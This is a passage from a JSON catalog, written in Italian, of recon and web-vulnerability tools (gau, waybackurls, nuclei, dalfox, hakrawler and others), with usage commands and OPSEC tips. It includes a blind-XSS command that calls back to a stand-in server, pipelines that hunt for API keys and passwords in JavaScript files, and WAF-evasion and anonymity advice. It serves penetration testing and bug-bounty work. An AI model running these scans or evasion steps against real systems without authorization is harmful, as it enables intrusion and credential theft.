class=\"rt-green\">Utilizzo</h4><pre><code># Workflow base: accumula subdomain da run multipli\nsubfinder -d target.com | anew subdomains.txt\namass enum -d target.com | anew subdomains.txt\nassetfinder target.com | anew subdomains.txt\n# subdomains.txt ora contiene l'unione senza duplicati\n\n# Pipeline: processa SOLO i nuovi subdomain trovati\nsubfinder -d target.com | anew subdomains.txt | httpx -silent | nuclei\n# httpx e nuclei vedono solo subdomain nuovi, non già processati\n\n# Continuous recon con notifica nuove scoperte\nwhile true; do\n  subfinder -d target.com -silent | anew subdomains.txt | \\\n    notify -silent -provider slack  # notifica solo nuovi\n  sleep 3600  # ogni ora\ndone\n\n# Dry-run per vedere differenze tra due scansioni\nsubfinder -d target.com | anew -d old_subdomains.txt\n# Mostra solo i subdomain nuovi rispetto alla scansione precedente\n\n# Merge file senza duplicati\ncat file1.txt file2.txt file3.txt | anew -q merged.txt\n\n# Accumula URL da tool multipli in parallelo\ngau target.com | anew urls.txt &amp;\nwaybackurls target.com | anew urls.txt &amp;\nwait\ncat urls.txt | uro > clean_urls.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Continuous Recon:</strong> Esegui scansioni periodiche accumulando risultati. Processa solo le nuove scoperte evitando lavoro duplicato</li><li><strong>Multi-Tool Aggregation:</strong> Combina output di subfinder, amass, assetfinder in un unico file deduplicato</li><li><strong>Delta Processing:</strong> In pipeline, passa ai tool successivi solo i risultati nuovi (es. scansiona con nuclei solo subdomain appena scoperti)</li><li><strong>Bug Bounty Monitoring:</strong> Integra con notify per alert su nuovi asset in scope</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Nessun Traffico:</strong> Tool puramente locale, opera solo su file e stdin/stdout</li><li><strong>Performance:</strong> Efficiente anche su file grandi grazie a map lookup O(1) in memoria</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "06_Miscellaneous",
      "Utilities"
    ],
    "notes": null
  },
  {
    "id": "gau",
    "name": "gau",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/lc/gau",
    "desc": "Recupera URL noti da AlienVault OTX, Wayback Machine, Common Crawl e URLScan per un dominio.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>GAU</strong> (GetAllUrls) è un'utility Go veloce e leggera che aggrega URL da 4 fonti storiche principali: Wayback Machine (archive.org), Common Crawl, AlienVault's Open Threat Exchange (OTX), e URLScan.io. A differenza di waybackurls (solo Wayback), gau combina multiple fonti per massimizzare la scoperta di endpoint storici, path legacy, e risorse non più linkate ma potenzialmente ancora accessibili. È uno dei tool più usati nella fase iniziale di bug bounty recon.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Source Parallel:</strong> Interroga tutte e 4 le fonti simultaneamente. Ogni fonte ha punti di forza diversi: OTX per threat intel, URLScan per siti recenti, Common Crawl per coverage commerciale.</p><p><strong>Smart Filtering:</strong> Blacklist per escludere estensioni inutili (png, jpg, css, woff), whitelist per includere solo estensioni interessanti, filtri per MIME type e status code HTTP.</p><p><strong>Fetch Parameters:</strong> Flag <code>--fp</code> rimuove URL con stesso path ma parametri diversi, riducendo drasticamente i duplicati mantenendo la varietà di endpoint.</p><p><strong>Date Range:</strong> Filtra per periodo temporale (<code>--from</code>, <code>--to</code>) per trovare URL di versioni specifiche del sito.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># URL discovery base per singolo dominio\ngau target.com --o urls.txt\n\n# Escludi asset statici (riduce noise ~80%)\ngau target.com --blacklist png,jpg,gif,svg,css,woff,woff2,ttf,ico\n\n# Solo estensioni interessanti per web testing\ngau target.com --whitelist php,asp,aspx,jsp,json,xml,js\n\n# Rimuovi URL con stesso path (deduplica parametri)\ngau target.com --fp | uro > unique_paths.txt\n\n# Batch processing da lista subdomain\ncat subdomains.txt | gau --threads 5 --o all_urls.txt\n\n# Filtra per periodo (cerca versioni vulnerabili)\ngau target.com --from 2019 --to 2021 | grep -E \"api|admin\"\n\n# Output JSON per parsing programmatico\ngau target.com --json | jq -r '.url'\n\n# Pipeline completa: gau -> uro -> parametri -> nuclei\ngau target.com | uro --filter hasparams | \\\n  qsreplace 'FUZZ' | sort -u | nuclei -t fuzzing-templates/\n\n# Combina con waybackurls per coverage massima\n{ gau target.com; waybackurls target.com; } | sort -u | uro > combined.txt\n\n# Con provider specifici (config ~/.gau.toml)\ngau target.com --providers wayback,otx  # solo queste fonti</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Initial Recon:</strong> Primo passo in bug bounty - mappa tutti gli endpoint storici prima di scansioni attive</li><li><strong>Legacy Endpoint Discovery:</strong> Trova /api/v1/ quando il sito usa /api/v3/, admin panels con path non standard, debug endpoints dimenticati</li><li><strong>Parameter Mining:</strong> Estrai nomi di parametri usati storicamente per costruire wordlist custom di fuzzing</li><li><strong>JavaScript Analysis:</strong> Filtra per .js per trovare file JS storici che potrebbero contenere endpoint hardcoded o secrets</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Completamente Passivo:</strong> Zero traffico verso il target.</p><p>Query solo verso archivi pubblici</li><li><strong>Rate Limits:</strong> Le fonti hanno limiti (Wayback ~15 req/min).</p><p>Gau li gestisce automaticamente</li><li><strong>API Keys:</strong> URLScan e OTX funzionano meglio con API key in ~/.gau.toml</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "jaeles",
    "name": "jaeles",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/jaeles-project/jaeles",
    "desc": "Framework per web security scanning basato su signature YAML customizzabili per vulnerability detection.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Jaeles</strong> è un framework Go per costruire scanner di sicurezza web personalizzati basati su signature YAML. A differenza di nuclei che ha template pre-definiti, Jaeles eccelle nella creazione di detection logic custom grazie al suo linguaggio di signature espressivo. Supporta detection di XSS, SQLi, LFI, SSRF, misconfigurations e CVE specifiche. Descritto come \"Swiss Army knife for automated Web Application Testing\", gestisce fino a 100+ richieste concorrenti con retry automatico e rate limiting intelligente.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Expressive Signatures:</strong> Linguaggio YAML potente con variabili, condizioni, regex matching, e response analysis. Permette detection logic complessa impossibile con altri scanner.</p><p><strong>Signature Levels:</strong> Tre livelli di aggressività (L1=safe, L2=medium, L3=aggressive). Permette di controllare il rischio di triggering WAF o causare problemi.</p><p><strong>Passive &amp; Active:</strong> Supporta sia analisi passiva di response già catturate che testing attivo con payload injection.</p><p><strong>Rich Reporting:</strong> Output in JSON, HTML con screenshot, Markdown. Integrazione con Burp Suite tramite plugin dedicato.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Download signature ufficiali (primo utilizzo)\njaeles config init\n\n# Scan base con tutte le signature\njaeles scan -s ~/.jaeles/base-signatures/ -u https://target.com/\n\n# Solo signature CVE critiche\njaeles scan -s cves/ -u https://target.com -L 1 --no-background\n\n# Batch scan da lista URL con output HTML\ncat urls.txt | jaeles scan -s passives/ -o ./results --html\n\n# Scan parametri per injection (SQLi, XSS)\njaeles scan -s sqli,xss -U params_urls.txt -c 50 --verbose\n\n# Con header custom (auth required)\njaeles scan -s all -u https://target.com \\\n  -H \"Authorization: Bearer eyJ...\" \\\n  -H \"Cookie: session=abc123\"\n\n# Pipeline: gau -> filtra params -> jaeles\ngau target.com | uro --filter hasparams | \\\n  jaeles scan -s sqli,ssrf -c 30 -o findings/\n\n# Signature custom per la tua organizzazione\njaeles scan -s /path/to/custom-signatures/ -U targets.txt\n\n# Solo passive analysis (no active requests)\njaeles scan -s passives/ --passive -U urls.txt\n\n# Con proxy per debug/logging in Burp\njaeles scan -s all -u https://target.com --proxy http://127.0.0.1:8080</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Custom Vulnerability Detection:</strong> Crea signature specifiche per vulnerabilità della tua organizzazione o CVE non ancora coperte da altri scanner</li><li><strong>Regression Testing:</strong> Verifica che vulnerabilità fixate non riappaiano in nuove release</li><li><strong>CI/CD Security Gate:</strong> Integra in pipeline DevSecOps per bloccare deploy con vulnerabilità note</li><li><strong>Bug Bounty Automation:</strong> Scansiona automaticamente nuovi endpoint scoperti durante recon</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Traffico Attivo:</strong> Genera richieste HTTP con payload potenzialmente malevoli (SQLi, XSS payloads)</li><li><strong>WAF Detection:</strong> Signature aggressive (L3) possono triggare WAF.</p><p>Usa L1 per engagement stealth</li><li><strong>Rate Limiting:</strong> Configura <code>-c</code> (concurrency) e <code>--delay</code> per evitare ban</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "waybackurls",
    "name": "waybackurls",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/tomnomnom/waybackurls",
    "desc": "Recupera tutti gli URL archiviati dalla Wayback Machine per un dominio e i suoi subdomain.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Waybackurls</strong> è un'utility Go di tomnomnom che interroga la Wayback Machine (archive.org) per recuperare tutti gli URL storici archiviati per un dominio. A differenza di gau che usa multiple fonti, waybackurls si concentra esclusivamente su Wayback Machine, risultando più veloce e leggero per query singole. Recupera automaticamente URL per tutti i subdomain archiviati del dominio target, rendendolo ideale come primo passo nella recon passiva.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Subdomain Coverage:</strong> Recupera URL non solo per target.com ma anche per tutti i subdomain storicamente archiviati (api.target.com, staging.target.com, etc.).</p><p><strong>High Performance:</strong> Implementazione Go compilata, significativamente più veloce degli script Python equivalenti. Gestisce domini con milioni di URL archiviati.</p><p><strong>Pipeline Native:</strong> Accetta domini da stdin e output su stdout, perfetto per integrazione in workflow bash complessi.</p><p><strong>No Dependencies:</strong> Single binary senza dipendenze esterne, facilmente deployabile su qualsiasi sistema.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># URL discovery per singolo dominio\nwaybackurls target.com > all_urls.txt\n\n# Batch processing da lista subdomain\ncat subdomains.txt | waybackurls > all_historical_urls.txt\n\n# Filtra per endpoint interessanti\nwaybackurls target.com | grep -E \"api|admin|backup|config|debug\" > interesting.txt\n\n# Pipeline: waybackurls -> deduplica -> filtra params -> test\nwaybackurls target.com | uro --filter hasparams | \\\n  qsreplace 'FUZZ' | sort -u > fuzz_targets.txt\n\n# Cerca file JavaScript storici (secret hunting)\nwaybackurls target.com | grep \"\\.js$\" | sort -u > js_files.txt\nhttpx -silent -l js_files.txt -mc 200 | \\\n  xargs -I {} bash -c 'curl -s {} | js-beautify' | \\\n  grep -iE \"api_key|secret|password|token\"\n\n# Combina con gau per coverage massima\n{ waybackurls target.com; gau target.com; } | sort -u | uro > combined.txt\n\n# Trova backup files dimenticati\nwaybackurls target.com | grep -iE \"\\.(bak|backup|old|sql|zip|tar|gz)$\"\n\n# Con timestamps (per analisi temporale)\nwaybackurls -dates target.com | sort -t '/' -k1 > urls_with_dates.txt\n\n# Continuous monitoring\nwhile true; do\n  waybackurls target.com | anew urls.txt | notify -provider slack\n  sleep 86400  # daily check\ndone</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Initial Passive Recon:</strong> Primo tool da lanciare - zero traffico verso target, scopre attack surface storica</li><li><strong>Legacy Endpoint Discovery:</strong> Trova versioni API deprecate (/api/v1/), admin panels con path non standard, staging environments</li><li><strong>Secret Hunting:</strong> File JS storici spesso contengono API keys, endpoint interni, credenziali hardcoded poi rimosse</li><li><strong>Backup File Discovery:</strong> Trova .bak, .sql, .zip archiviati e potenzialmente ancora accessibili sul server live</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>100% Passivo:</strong> Nessun traffico verso il target. Tutte le query vanno a web.archive.org</li><li><strong>Rate Limit:</strong> Wayback ha limiti (~15 req/min).</p><p>Per domini grandi, considera waymore che gestisce meglio i limiti</li><li><strong>Coverage:</strong> Solo Wayback Machine. Per coverage completa, combina con gau o waymore</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "projectdiscovery-nuclei",
    "name": "nuclei",
    "version": "latest",
    "icon": "../app/icons/nuclei-logo.svg",
    "installation": "Go",
    "repo": "https://github.com/projectdiscovery/nuclei",
    "desc": "Scanner di vulnerabilità basato su template YAML con supporto multi-protocollo e community-driven.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Nuclei</strong> è lo scanner di vulnerabilità open-source più potente e versatile disponibile, costruito su un ecosistema di template YAML contribuiti da migliaia di security professional in tutto il mondo. A differenza degli scanner tradizionali che si basano su signature proprietarie, Nuclei permette a chiunque di creare, condividere e personalizzare detection logic per qualsiasi tipo di vulnerabilità, misconfiguration o esposizione. Supporta scansioni via TCP, DNS, HTTP, SSL, WHOIS, JavaScript, Headless browser, Code execution e Websocket, rendendolo applicabile a praticamente qualsiasi scenario di security testing.</p><p>L'architettura è ottimizzata per velocità: il request clustering riduce drasticamente il numero di connessioni, la gestione intelligente del rate limiting previene blocchi, e il parallelismo configurabile permette di scansionare migliaia di host in minuti. La community maintiene oltre 8000 template pubblici che coprono CVE recenti, misconfiguration comuni, exposed panels, default credentials e vulnerability class specifiche.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Template-Based Architecture:</strong> Ogni controllo è definito in un file YAML human-readable. Questo permette audit del comportamento, customizzazione immediata e contribuzione community. I template supportano matchers regex, status code, word matching e DSL expressions per logica complessa.</p><p><strong>Multi-Protocol Support:</strong> HTTP/HTTPS con supporto full request customization, DNS per record enumeration e zone transfer detection, TCP/UDP raw per servizi custom, SSL/TLS per certificate analysis e cipher suite testing, File per local vulnerability scanning, Code per execution-based detection, Headless per JavaScript-rendered content e authentication flows.</p><p><strong>Workflow &amp; Automation:</strong> I workflow permettono di concatenare template in sequenze logiche (es. prima identifica CMS, poi lancia template specifici). Le variabili condivise permettono di passare dati tra step (es. token CSRF estratto usato in request successive).</p><p><strong>Enterprise Features:</strong> Integrazione nativa con Jira, Splunk, GitHub Issues, Elastic, GitLab, Slack, Discord, Telegram. Supporto per scan scheduling, reporting avanzato e team collaboration tramite ProjectDiscovery Cloud.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SCANSIONI BASE ===\n# Scan singolo target con tutti i template (non raccomandato su target prod)\nnuclei -u https://target.com\n\n# Scan con severity filter - solo critical e high (raccomandato per primo assessment)\nnuclei -u https://target.com -severity critical,high\n\n# === SCANSIONI MIRATE ===\n# Solo CVE degli ultimi 2 anni con rate limiting (evita WAF blocks)\nnuclei -u https://target.com -t cves/ -rl 50 -c 5 \\\n  -tags cve2024,cve2025 -o cve_results.txt\n\n# Template specifici per CMS detection + exploitation\nnuclei -u https://target.com -t technologies/ -t cves/wordpress/ \\\n  -t cves/joomla/ -t cves/drupal/ -json -o cms_vulns.json\n\n# === SCANSIONI MASSIVE ===\n# Batch scan da output di subfinder/httpx\nsubfinder -d target.com -silent | httpx -silent | \\\n  nuclei -t exposures/ -t misconfiguration/ -t cves/ \\\n  -severity medium,high,critical -c 50 -rl 100 -o findings.txt\n\n# Scan con resume (riprende se interrotto)\nnuclei -l 10k_urls.txt -t cves/ -resume\n\n# === TEMPLATE PERSONALIZZATI ===\n# Esegui template custom + community\nnuclei -u https://target.com -t ~/my-templates/ -t cves/ -validate\n\n# Cerca template per keyword\nnuclei -tl | grep -i \"wordpress\"\n\n# === OUTPUT &amp; REPORTING ===\n# Output multipli formati per reporting\nnuclei -l urls.txt -t cves/ -severity critical,high \\\n  -json -o detailed.json \\\n  -me markdown_export/ \\\n  -sarif sarif_report.sarif\n\n# === INTEGRAZIONE CI/CD ===\n# GitHub Actions compatible - exit 1 se critical found\nnuclei -l urls.txt -t cves/ -severity critical -silent -nc || exit 1\n\n# === SCANSIONI SPECIFICHE ===\n# Exposed panels e takeover\nnuclei -l subdomains.txt -t takeovers/ -t exposed-panels/ -c 100\n\n# Default credentials check\nnuclei -l urls.txt -t default-logins/ -rl 5 -c 2\n\n# SSL/TLS misconfiguration\nnuclei -l hosts.txt -t ssl/ -t misconfiguration/tls/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Vulnerability Assessment continuo:</strong> Integrato in pipeline CI/CD per scansione automatica ad ogni deploy, catch vulnerabilità prima che raggiungano produzione.</li><li><strong>Bug Bounty hunting:</strong> Template community coprono le vulnerability class più remunerative (SSRF, RCE, Auth bypass). La velocità permette di testare scope enormi rapidamente.</li><li><strong>Compliance e Audit:</strong> Template per verifica configurazioni SSL/TLS, security header, exposed services. Report esportabili per documentazione audit.</li><li><strong>Threat Detection:</strong> Template per webshell detection, malware indicators, compromission signs su infrastruttura già violata.</li><li><strong>Red Team reconnaissance:</strong> Identificazione rapida di entry point prima di exploitation manuale.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Fingerprinting:</strong> User-Agent default \"Nuclei\" è facilmente riconoscibile. Usa <code>-H \"User-Agent: Mozilla/5.0...\"</code> per blending.</li><li><strong>Payload detection:</strong> Molti template inviano payload attivi (SQLi, XSS, RCE attempts). WAF/IDS triggereranno alert.</li><li><strong>Rate limiting:</strong> Senza <code>-rl</code> e <code>-c</code> appropriati, il volume di richieste può causare blocchi o DoS involontari.</li><li><strong>Log forensics:</strong> Ogni richiesta Nuclei è loggata server-side. Template custom con identificatori unici sono tracciabili.</li></ul><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "dalfox",
    "name": "dalfox",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/hahwul/dalfox",
    "desc": "Scanner XSS automatizzato con detection reflected, stored e DOM-based tramite analisi statica e headless browser.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>DalFox</strong> (DAta Leak and Finding Open Redirect/XSS) è lo scanner XSS più avanzato disponibile, costruito in Go da hahwul per automatizzare la detection di vulnerabilità Cross-Site Scripting in applicazioni web moderne. A differenza di scanner generici, DalFox è specializzato esclusivamente su XSS, implementando tecniche sofisticate che combinano analisi statica del codice sorgente, dynamic analysis tramite parameter fuzzing, e verifica comportamentale con headless browser per confermare l'effettiva esecuzione JavaScript.</p><p>Il tool eccelle nel gestire scenari complessi: WAF bypass tramite encoding chain e payload mutation, context-aware injection che adatta i payload al contesto HTML/JavaScript/Attribute in cui vengono riflessi, e DOM-based XSS detection che altri tool spesso mancano. La modalità Blind XSS supporta callback a server esterni per catturare esecuzioni delayed. Con oltre 1500 payload built-in e supporto per custom payloads, DalFox rappresenta lo state-of-the-art nel XSS hunting automatizzato.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Mode Architecture:</strong> URL mode per test singoli, File mode per batch scanning, Pipe mode per integrazione in pipeline Unix, SXSS mode per Stored XSS con form submission automatica, Server mode che espone REST API per integrazione con altri tool, Payload mode per generazione di payload contestuali.</p><p><strong>Intelligent Parameter Analysis:</strong> Mining automatico di parametri da HTML source, JavaScript files e form elements. Identifica reflection points prima del fuzzing, ottimizzando le richieste e riducendo il rumore.</p><p><strong>Context-Aware Fuzzing:</strong> Analizza dove il payload viene riflesso (tag HTML, attributo, JavaScript context, URL parameter) e seleziona automaticamente i payload più efficaci per quel contesto specifico. Supporta breaking out da attributi, tag, commenti HTML e stringhe JS.</p><p><strong>WAF Bypass Engine:</strong> Implementa encoding chain (HTML entities, URL encoding, Unicode normalization, case variation), payload mutation e tecniche di evasione per bypassare WAF comuni come Cloudflare, Akamai, ModSecurity.</p><p><strong>Verification System:</strong> Headless browser integration (Chrome/Chromium) per verificare che i payload trovati effettivamente triggherino l'esecuzione JavaScript, eliminando falsi positivi da reflection senza execution.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === SCANNING BASE ===\n# Scan URL singolo con tutti i controlli\ndalfox url \"https://target.com/search?q=test\" -o results.txt\n\n# Scan con parametri multipli\ndalfox url \"https://target.com/page?id=1&amp;name=test&amp;action=view\"\n\n# === SCANSIONI MASSIVE ===\n# Pipeline da gau/waybackurls - workflow tipico bug bounty\ngau target.com | grep \"=\" | uro | dalfox pipe -o xss_findings.txt\n\n# Batch scan con concurrency e timeout configurati\ndalfox file urls_with_params.txt -w 50 --timeout 10 -o batch_results.txt\n\n# === MODALITA' AVANZATE ===\n# Stored XSS - testa form submission\ndalfox sxss \"https://target.com/comment\" -d \"comment=FUZZ\" \\\n  --trigger \"https://target.com/view-comments\"\n\n# Blind XSS con callback server\ndalfox url \"https://target.com/feedback?msg=test\" \\\n  --blind \"https://your-server.com/callback\"\n\n# === WAF BYPASS ===\n# Encoding chain per WAF evasion\ndalfox url \"https://target.com/search?q=test\" \\\n  --waf-evasion --encoder url,html,unicode\n\n# Custom payload con WAF bypass\ndalfox url \"https://target.com/\" --custom-payload waf_bypass.txt \\\n  --skip-bav  # skip basic attack vectors, usa solo custom\n\n# === CONFIGURAZIONI AVANZATE ===\n# Con headers custom (auth, cookie)\ndalfox url \"https://target.com/api?q=test\" \\\n  -H \"Cookie: session=abc123\" \\\n  -H \"Authorization: Bearer token\" \\\n  --proxy http://127.0.0.1:8080  # route attraverso Burp\n\n# Mining parametri da pagina e test automatico\ndalfox url \"https://target.com/page\" --mining-all --deep-domxss\n\n# === OUTPUT &amp; REPORTING ===\n# Output JSON per parsing programmatico\ndalfox file urls.txt --format json -o report.json\n\n# Solo URL vulnerabili (per pipeline)\ndalfox pipe &lt; urls.txt --silence --only-poc\n\n# === SERVER MODE ===\n# Avvia API server per integrazione\ndalfox server --host 0.0.0.0 --port 6664\n# Poi: curl -X POST http://localhost:6664/scan -d '{\"url\":\"...\"}'\n\n# === DOM XSS SPECIFICO ===\n# Deep DOM analysis con headless\ndalfox url \"https://spa-target.com/#/page?param=test\" \\\n  --deep-domxss --headless</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Bug Bounty hunting:</strong> XSS rimane una delle vulnerabilità più comuni e remunerative. DalFox permette di testare migliaia di URL in batch, trovando injection points che scanner generici mancano.</li><li><strong>Penetration Testing web:</strong> Verifica sistematica di tutti i parametri user-controllati per reflection XSS. Il report dettagliato include PoC copiabili per il deliverable.</li><li><strong>Stored XSS assessment:</strong> La modalità SXSS automatizza il test di form che persistono input e lo rendono visibile ad altri utenti (commenti, profili, messaggi).</li><li><strong>DOM XSS research:</strong> L'integrazione headless browser è essenziale per SPA moderne dove la reflection avviene client-side tramite JavaScript.</li><li><strong>CI/CD security gate:</strong> Integrato in pipeline per regression testing, assicura che fix XSS non vengano reintrodotti in release successive.</li><li><strong>WAF testing:</strong> Utile per security team che vogliono verificare l'efficacia delle regole WAF contro XSS payload evoluti.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Rilevamento WAF:</strong> I payload XSS (tag script, event handlers, javascript: URI) sono pattern ben noti ai WAF. Aspettarsi blocchi frequenti senza evasion.</li><li><strong>Rate limiting:</strong> Molti parametri per pagina generano molte richieste. Configurare <code>-w</code> e <code>--delay</code> per evitare blocchi.</li><li><strong>Log analysis:</strong> Ogni payload testato è loggato server-side. Pattern come <code>&lt;script&gt;</code> nei log sono red flag evidenti.</li><li><strong>Headless detection:</strong> Siti con bot detection (Cloudflare, PerimeterX) possono identificare e bloccare il browser headless.</li><li><strong>Blind XSS exposure:</strong> Il callback server espone il tuo IP. Usare server terzi o VPN per anonimato.</li></ul><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "XSS"
    ],
    "notes": null
  },
  {
    "id": "hakrawler",
    "name": "hakrawler",
    "version": "latest",
    "icon": "../app/icons/github.svg",
    "installation": "Go",
    "repo": "https://github.com/hakluke/hakrawler",
    "desc": "Web crawler veloce in Go per scoprire URL e file JavaScript durante la reconnaissance.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Hakrawler</strong> è un web crawler minimalista ma potente, costruito in Go utilizzando la libreria Colly, ottimizzato per la fase di reconnaissance di security assessments. A differenza di crawler general-purpose come Burp Spider, Hakrawler è progettato specificamente per le esigenze dei penetration tester: estrae rapidamente tutti i link, form, endpoint e file JavaScript da un'applicazione web, producendo output pulito ready per pipeline con altri tool.</p><p>La sua forza sta nella semplicità e velocità: accetta URL da stdin, crawla con parallelismo configurabile, e produce output su stdout che può essere direttamente pipelined a tool di vulnerability scanning. Il supporto per scope control (subdomain, same-domain, all) e depth limiting permette di calibrare precisamente l'ampiezza della scansione in base al target e al tempo disponibile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Concurrent Crawling:</strong> Parallelismo configurabile (default 8 thread) per bilanciare velocità e carico sul target. Ogni thread mantiene la propria sessione HTTP con connection pooling.</p><p><strong>Scope Control Granulare:</strong> <code>-subs</code> include subdomain nel crawl (es. da target.com crawla anche api.target.com), <code>-depth</code> limita la profondità di link follow, utile per site con strutture profonde o infinite loop detection.</p><p><strong>Output Customization:</strong> Output plain text (un URL per riga) per pipeline Unix, oppure JSON strutturato con metadata (source page, tag type, attribute). L'opzione <code>-u</code> deduplica l'output on-the-fly.</p><p><strong>JavaScript Discovery:</strong> Estrae tutti i riferimenti a file .js, fondamentale per successiva analisi con tool come LinkFinder o JSParser che cercano endpoint e secrets hardcoded nel codice.</p><p><strong>Form &amp; Endpoint Extraction:</strong> Identifica form HTML con relativi action URL e metodi, e parametri query string che possono essere target di injection testing.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># === CRAWLING BASE ===\n# Crawl singolo target - estrai tutti i link\necho \"https://target.com\" | hakrawler\n\n# Include subdomain nel scope (segue link a *.target.com)\necho \"https://target.com\" | hakrawler -subs\n\n# Limita profondità per siti enormi\necho \"https://target.com\" | hakrawler -depth 3\n\n# === PIPELINE RECON ===\n# Workflow completo: subdomain -&gt; probe -&gt; crawl -&gt; dedup\nsubfinder -d target.com -silent | httpx -silent | hakrawler -subs -u | tee all_urls.txt\n\n# Estrai solo file JavaScript per analisi secrets\necho \"https://target.com\" | hakrawler -subs | grep \"\\.js$\" | sort -u &gt; js_files.txt\ncat js_files.txt | xargs -I {} bash -c 'curl -s {} | grep -oE \"[a-zA-Z0-9_]+=[a-zA-Z0-9]+\"'\n\n# === SCANSIONE MASSIVA ===\n# Crawl lista di subdomain con output JSON\ncat live_hosts.txt | hakrawler -subs -depth 2 -json &gt; crawl_results.json\n\n# Pipeline verso nuclei per vulnerability scan\ncat live_hosts.txt | hakrawler -subs -u | nuclei -t exposures/ -t cves/ -o vulns.txt\n\n# === CONFIGURAZIONI AVANZATE ===\n# Con autenticazione via cookie\necho \"https://target.com\" | hakrawler -h \"Cookie: session=abc123; token=xyz\"\n\n# Attraverso proxy per logging in Burp\necho \"https://target.com\" | hakrawler -proxy http://127.0.0.1:8080\n\n# User-Agent custom per evitare blocchi\necho \"https://target.com\" | hakrawler -h \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"\n\n# === ESTRAZIONE PARAMETRI ===\n# Trova URL con parametri per injection testing\necho \"https://target.com\" | hakrawler -subs | grep \"?\" | grep \"=\" | sort -u &gt; urls_with_params.txt\n\n# Pipeline diretta a dalfox per XSS scan\necho \"https://target.com\" | hakrawler -subs | grep \"=\" | dalfox pipe -o xss_results.txt\n\n# === OUTPUT STRUTTURATO ===\n# JSON per parsing programmatico\necho \"https://target.com\" | hakrawler -json | jq '.url' -r | sort -u</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><ul><li><strong>Attack Surface Mapping:</strong> Prima fase di ogni web pentest - mappa tutti gli endpoint raggiungibili dall'applicazione target prima di procedere con testing specifico.</li><li><strong>JavaScript Analysis Setup:</strong> Estrae tutti i file .js per successiva analisi con LinkFinder, JSParser o grep manuali alla ricerca di API keys, endpoint interni, secrets hardcoded.</li><li><strong>Bug Bounty recon:</strong> Parte essenziale della recon pipeline insieme a subfinder, httpx, gau. Trova pagine e parametri che non appaiono in archivi storici.</li><li><strong>Form Discovery:</strong> Identifica form di login, registrazione, contatto, upload che sono target primari per testing di autenticazione, CSRF, injection.</li><li><strong>Scope Verification:</strong> Per programmi bug bounty con scope definiti, verifica quali endpoint sono effettivamente raggiungibili e in-scope.</li></ul><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><ul><li><strong>Traffic Volume:</strong> Il crawling genera molte richieste HTTP. Senza rate limiting, può apparire come DDoS o attivare protezioni automatiche.</li><li><strong>Log Footprint:</strong> Ogni URL visitata è loggata server-side. Il pattern di accesso sequenziale a tutti gli endpoint è riconoscibile.</li><li><strong>WAF Detection:</strong> User-Agent default e pattern di crawling possono triggerare blocchi WAF. Usare <code>-h</code> per header custom.</li><li><strong>Infinite Loops:</strong> Siti con URL dinamiche (session ID, timestamp) possono causare crawl infiniti. Usare <code>-depth</code> per limitare.</li></ul><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "Crawling",
      "Active"
    ],
    "notes": null
  },
  {
